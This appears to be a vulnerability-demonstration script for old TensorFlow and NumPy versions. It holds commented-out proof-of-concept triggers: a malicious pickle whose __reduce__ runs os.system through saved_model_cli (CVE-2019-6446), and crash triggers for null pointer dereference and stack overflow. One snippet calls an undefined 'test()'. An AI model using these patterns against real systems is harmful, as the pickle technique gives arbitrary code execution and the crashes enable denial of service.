#Version - TensorFlow version 2.3.1
#NumPy version 1.17

from tensorflow._api.v2 import dtypes

import os
import pickle
import tensorflow as tf
import numpy as np
from unittest.mock import MagicMock
from tensorflow.python.tools import saved_model_cli

import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' 

print("Tensorflow version: " + tf.version.VERSION)
print("Numpy version: " + np.__version__)

## Numpy.pad - Arbitrary code execution example
## https://nvd.nist.gov/vuln/detail/CVE-2019-6446

# class Exploit(object):
#     def __init__(self):
#         self.a = 1
#     def __reduce__(self):
#         return (os.system,('echo Arbitrary Code Execution: Your system is under control',))
# tmpdaa = Exploit()
# with open("exploit.pickle",'wb') as f:
#     pickle.dump(tmpdaa,f)

# saved_model_cli.load_inputs_from_input_arg_string("input1=exploit.pickle","","")


# https://github.com/numpy/numpy/pull/13273


## Numpy.array - Null Pointer Dereference TensorFlow example 
# class exploitnparray:
#     __array_interface__ = {}
# exploit = exploitnparray()
# print("Vulnerable function triggering - Null pointer dereference in Tensorflow through numpy.array")
# tf.make_tensor_proto([exploit])
# print('Failed to exploit') #Unreachable code


#numpy.dtype success

## Numpy.dtype - stack overflow example 1
## https://github.com/numpy/numpy/issues/12982
## Tensorflow example
# from unittest.mock import MagicMock
# print("Vulnerable function triggering - Stack overflow/Infinite Recursion in Tensorflow through numpy.dtype")
# print(tf.dtypes.as_dtype(MagicMock())) #crashes here
# print('Failed to exploit') #Unreachable code


## Numpy.dtype - stack overflow example 2
## https://github.com/numpy/numpy/issues/12751 

# class exploit(object):
#     @property
#     def dtype(self):
#         return self
# x = test()
# print("Vulnerable function triggering")
# print(tf.dtypes.as_dtype(x)) #Segmentation fault/Stack overflow
# print("Failed to trigger") #Does not reach
